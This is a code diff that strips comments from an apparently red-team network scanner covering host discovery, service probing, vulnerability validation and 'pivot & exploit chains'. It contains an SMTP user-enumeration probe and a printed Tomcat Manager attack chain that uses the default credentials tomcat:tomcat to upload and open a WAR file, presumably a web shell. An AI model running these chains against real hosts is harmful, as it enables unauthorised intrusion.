@@ -29,7 +29,6 @@ from typing import Dict, List, Optional
 from lightscan.core.engine import ScanResult, Severity
 from lightscan.scan.portscan import SERVICE_MAP, CRIT_PORTS, HIGH_PORTS, tcp_scan
 
-# Intensity port lists
 INTENSITY_PORTS: Dict[int, object] = {
     1: [21,22,23,25,80,443,445,3389,8080],
     2: [21,22,23,25,53,80,110,139,143,443,445,1433,3306,3389,5432,8080,8443],
@@ -38,8 +37,6 @@ INTENSITY_PORTS: Dict[int, object] = {
     4: "top1000",
     5: "all",
 }
-
-# Phase 1: Host Discovery
 
 def _icmp_checksum(data: bytes) -> int:
     if len(data) % 2: data += b"\x00"
@@ -143,14 +140,12 @@ async def discover_hosts(targets: List[str], timeout: float = 1.5,
     await asyncio.gather(*[_probe(t) for t in targets])
     return live
 
-# Phase 2: Deep Service Probing
-
 _PROTO_PROBES: Dict[int, bytes] = {
-    21:    b"",                                         # FTP banner on connect
+    21:    b"",
     22:    b"SSH-2.0-LightScan_2.0\r\n",
     25:    b"EHLO redteam.local\r\nVRFY root\r\n",
     80:    b"GET / HTTP/1.0\r\nHost: x\r\n\r\n",
-    110:   b"",                                         # POP3 banner
+    110:   b"",
     143:   b"A001 CAPABILITY\r\n",
     389:   bytes([0x30,0x0c,0x02,0x01,0x01,0x60,0x07,0x02,0x01,0x03,0x04,0x00,0x80,0x00]),
     443:   b"GET / HTTP/1.0\r\nHost: x\r\n\r\n",
@@ -160,7 +155,7 @@ _PROTO_PROBES: Dict[int, bytes] = {
                   0x31,0x2E,0x30,0x00,0x02,0x4C,0x4D,0x31,0x2E,0x32,0x58,0x30,0x30,0x32,
                   0x00,0x02,0x4E,0x54,0x20,0x4C,0x41,0x4E,0x4D,0x41,0x4E,0x20,0x31,0x2E,
                   0x30,0x00,0x02,0x4E,0x54,0x20,0x4C,0x4D,0x20,0x30,0x2E,0x31,0x32,0x00]),
-    3306:  b"",                                         # MySQL greeting
+    3306:  b"",
     3389:  bytes([0x03,0x00,0x00,0x13,0x0e,0xe0,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x08,
                   0x00,0x03,0x00,0x00,0x00]),
     5432:  bytes([0x00,0x00,0x00,0x08,0x04,0xd2,0x16,0x2f]),
@@ -196,13 +191,6 @@ async def deep_probe(host: str, port: int, timeout: float = 3.0) -> dict:
     except Exception:
         pass
 
-    # real nmap-service-probes signature matching first - ~1200 real
-    # probes' worth of product/version/os/device-type instead of a
-    # handful of hand-picked regexes. port-scoped so a loosely-specific
-    # pattern from an unrelated service can't cross-match (see
-    # fingerprint.py). falls through to the old regex list below if
-    # nothing in the db matched, so this never regresses what already
-    # worked - it only adds coverage.
     product = os_hint = devtype = info = ""
     ver = ""
     if raw:
@@ -217,7 +205,7 @@ async def deep_probe(host: str, port: int, timeout: float = 3.0) -> dict:
                 devtype = sig.devtype
                 info    = sig.info
         except Exception:
-            pass  # bad regex in the db, missing data file, whatever - just fall through
+            pass
 
     if not ver:
         for pat in [r"OpenSSH[_\s]([\d\.p]+)", r"Apache[/\s]([\d\.]+)", r"nginx[/\s]([\d\.]+)",
@@ -228,8 +216,6 @@ async def deep_probe(host: str, port: int, timeout: float = 3.0) -> dict:
 
     return {"service": service, "banner": banner, "version": ver,
             "product": product, "os": os_hint, "devtype": devtype, "info": info}
-
-# Phase 3: Vulnerability Validation
 
 _PORT_VALIDATORS: dict[int, list[callable]] = {}
 
@@ -395,8 +381,6 @@ async def _check_http_exposures(host, port, timeout) -> List[ScanResult]:
     await asyncio.gather(*[_check(*p) for p in PATHS])
     return results
 
-# Validator dispatch
-
 _HTTP_PORTS = {80, 443, 8000, 8080, 8443, 8888, 3000, 5000, 9090}
 
 async def validate_port(host: str, port: int, timeout: float) -> List[ScanResult]:
@@ -411,8 +395,6 @@ async def validate_port(host: str, port: int, timeout: float) -> List[ScanResult
     if port in _HTTP_PORTS:
         out.extend(await _check_http_exposures(host, port, timeout))
     return out
-
-# Phase 4: Pivot suggestions
 
 def pivot_suggestions(host: str, open_ports: List[int],
                       vulns: List[ScanResult]) -> List[ScanResult]:
@@ -468,12 +450,6 @@ def pivot_suggestions(host: str, open_ports: List[int],
                 f"curl -u tomcat:tomcat http://{host}:8080/manager/text/deploy?path=/s --upload-file s.war",
                 f"curl http://{host}:8080/s/"]}))
 
-    # everything above is a hand-built chain for one specific attack. below
-    # catches whatever's left with a 'next' hint sitting in its data that
-    # nothing above already surfaced - ftp-anon/mongo-unauth/ldap-anon/
-    # telnet-brute all set one and used to just get dropped on the floor,
-    # and now cve templates can carry their own pivot: block and land here
-    # too instead of needing a hardcoded case added per template.
     _handled = {"redis-rce", "eternalblue", "tomcat-manager"}
     seen = set()
     for r in vulns:
@@ -489,8 +465,6 @@ def pivot_suggestions(host: str, open_ports: List[int],
             {"vector": vector, "commands": next_steps}))
 
     return out
-
-# Main active pipeline
 
 async def active_scan(
     targets:     List[str],
@@ -509,7 +483,6 @@ async def active_scan(
     results: List[ScanResult] = []
     C = "\033[38;5;196m"; R = "\033[0m"; G = "\033[38;5;82m"; DIM = "\033[38;5;240m"
 
-    # Phase 1 ─ Discovery
     if not skip_discovery:
         print(f"\n{C}⚡{R} \033[1m[PHASE 1] HOST DISCOVERY\033[0m \033[38;5;240m({len(targets)} targets)\033[0m")
         live = await discover_hosts(targets, timeout=min(timeout, 1.5), concurrency=concurrency)
@@ -527,7 +500,6 @@ async def active_scan(
     else:
         live_ips = targets
 
-    # Phase 2 ─ Port scan
     spec = ports
     if spec is None:
         raw_spec = INTENSITY_PORTS.get(intensity, INTENSITY_PORTS[3])
@@ -558,7 +530,6 @@ async def active_scan(
         print(f"\n{C}⚡{R} \033[1m[SWEEP COMPLETED]\033[0m {len(results)} host/port finding(s)\n")
         return results
 
-    # Phase 3 ─ Service probing
     print(f"\n{C}⚡{R} \033[1m[PHASE 3] DEEP SERVICE PROBING\033[0m")
     for host, plist in open_map.items():
         tasks = [deep_probe(host, p, timeout) for p in plist]
@@ -577,7 +548,6 @@ async def active_scan(
                      "product":product,"os":pr.get("os",""),"devtype":pr.get("devtype",""),
                      "info":pr.get("info","")}))
 
-    # Phase 4 ─ Vuln validation
     print(f"\n{C}⚡{R} \033[1m[PHASE 4] VULNERABILITY VALIDATION\033[0m")
     vuln_map: Dict[str, List[ScanResult]] = {}
 
@@ -592,7 +562,6 @@ async def active_scan(
 
     await asyncio.gather(*[_validate(h, p) for h, pl in open_map.items() for p in pl])
 
-    # Phase 5 ─ Pivot map
     print(f"\n{C}⚡{R} \033[1m[PHASE 5] PIVOT & EXPLOIT CHAINS\033[0m")
     for host, plist in open_map.items():
         for pv in pivot_suggestions(host, plist, vuln_map.get(host, [])):
